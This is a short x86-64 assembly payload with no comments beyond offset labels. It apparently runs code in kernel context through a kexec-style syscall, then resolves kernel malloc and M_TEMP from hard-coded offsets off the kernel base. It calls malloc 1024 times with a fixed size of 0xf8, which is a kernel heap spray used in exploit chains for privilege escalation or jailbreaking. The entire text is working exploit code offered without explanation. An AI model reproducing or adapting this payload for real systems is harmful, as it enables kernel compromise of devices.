use64

entry:
mov rsi, rdi
lea rdi, [rel kernel_entry]
mov eax, 11
syscall
ret

kernel_entry:
push rbp
push qword [rsi+8] ; kernel base
mov rcx, 1024
.loop:
push rcx
mov rax, [rsp+8] ; kernel base
mov edi, 0xf8 ; sz
lea rsi, [rax+0x1540eb0] ; M_TEMP
mov edx, 2
add rax, 0xd7a0 ; malloc
call rax
pop rcx
loop .loop
pop rdi
pop rbp
xor eax, eax
ret
align 8
